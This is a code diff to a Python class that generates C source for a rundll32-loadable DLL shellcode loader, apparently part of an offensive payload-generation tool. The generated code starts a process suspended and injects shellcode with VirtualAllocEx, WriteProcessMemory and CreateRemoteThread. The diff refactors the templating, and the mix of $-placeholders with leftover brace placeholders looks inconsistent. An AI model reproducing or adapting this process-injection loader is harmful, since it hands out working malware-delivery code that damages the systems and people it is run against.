@@ -1,3 +1,5 @@
+from string import Template
+
 class rundll:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -19,8 +21,8 @@ class rundll:
         return ['-luser32',
                 '-shared']
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 // Use __declspec(dllexport) and WINAPI (stdcall) for the export
@@ -50,12 +52,12 @@ int executecode(){{
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
+    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
@@ -75,4 +77,4 @@ __attribute__((dllexport)) void CALLBACK Dummy(HWND hwnd, HINSTANCE h, LPSTR c, 
 #ifdef __cplusplus
 }}
 #endif
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
